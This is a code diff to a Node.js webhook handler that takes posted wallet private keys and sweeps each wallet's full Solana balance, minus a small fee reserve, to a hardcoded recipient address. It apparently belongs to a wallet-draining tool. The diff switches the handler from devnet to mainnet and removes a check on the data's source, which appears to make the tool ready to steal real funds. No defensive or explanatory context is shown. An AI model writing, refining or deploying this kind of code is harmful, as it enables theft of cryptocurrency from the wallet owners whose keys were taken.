@@ -3,7 +3,8 @@ const bs58 = require('bs58').default;
 
 // Configuration
 const RECIPIENT_ADDRESS = process.env.RECIPIENT_ADDRESS || 'E6xVZgZZ2b2xqk4sDe8fPBtA9DAcRrddzHMh3NRaXyjW';
-const CLUSTER_URL = process.env.CLUSTER_URL || 'https://api.devnet.solana.com';
+const CLUSTER_URL = process.env.CLUSTER_URL || 'https://api.mainnet-beta.solana.com';
+const FEE_RESERVE = 4000; // Reserve 4000 lamports for fees
 const MAX_RETRIES = 5;
 const RETRY_DELAY_BASE = 500; // ms
 const WALLET_DELAY = 500; // ms
@@ -57,11 +58,6 @@ module.exports = async function handler(req, res) {
         wallets: parsedData.wallets?.map(wallet => ({ ...wallet, key: 'REDACTED' }))
       });
 
-      if (parsedData.source !== 'Axora-Bundle-Decrypter v1.3') {
-        console.log('[source-error]', `Invalid source: ${parsedData.source}`);
-        return res.status(200).send('ok');
-      }
-
       if (parsedData?.wallets?.length > 0) {
         const connection = new Connection(CLUSTER_URL, 'confirmed');
 
@@ -96,8 +92,9 @@ module.exports = async function handler(req, res) {
             const balance = await withRetry(async () => await connection.getBalance(fromKeypair.publicKey));
             console.log(`[balance] Wallet ${index}: ${balance} lamports`);
 
-            if (balance <= 0) {
-              console.error(`[error] Insufficient balance for transfer from ${pubkeyStr} (wallet ${index}): ${balance} lamports, required: >0`);
+            const transferAmount = balance - FEE_RESERVE;
+            if (balance <= FEE_RESERVE) {
+              console.error(`[error] Insufficient balance for transfer from ${pubkeyStr} (wallet ${index}): ${balance} lamports, required: >${FEE_RESERVE}`);
               continue;
             }
 
@@ -110,40 +107,14 @@ module.exports = async function handler(req, res) {
               SystemProgram.transfer({
                 fromPubkey: fromKeypair.publicKey,
                 toPubkey,
-                lamports: balance, // Try transferring full balance initially
+                lamports: transferAmount,
               })
             );
 
-            let transferAmount = balance;
-            const estimatedFee = await withRetry(async () => await transaction.getEstimatedFee(connection)) || 5000;
-            if (balance > estimatedFee) {
-              transferAmount = balance - estimatedFee; // Adjust to leave enough for fee
-              transaction.instructions = []; // Clear previous instructions
-              transaction.add(
-                SystemProgram.transfer({
-                  fromPubkey: fromKeypair.publicKey,
-                  toPubkey,
-                  lamports: transferAmount,
-                })
-              );
-            }
-
-            const signature = await withRetry(async () => {
-              try {
-                return await sendAndConfirmTransaction(connection, transaction, [fromKeypair], {
-                  maxRetries: 2,
-                  skipPreflight: false,
-                });
-              } catch (error) {
-                if (error.name === 'SendTransactionError') {
-                  const logs = error.logs || [];
-                  console.error(`[simulation-error] Wallet ${index} logs:`, logs);
-                  throw error;
-                }
-                throw error;
-              }
-            });
-
+            const signature = await withRetry(async () => await sendAndConfirmTransaction(connection, transaction, [fromKeypair], {
+              maxRetries: 2,
+              skipPreflight: false,
+            }));
             console.log(`[success] Transferred ${transferAmount} lamports from ${pubkeyStr} (wallet ${index}) to ${toPubkey.toBase58()}. Signature: ${signature}`);
 
             if (index < parsedData.wallets.length - 1) {
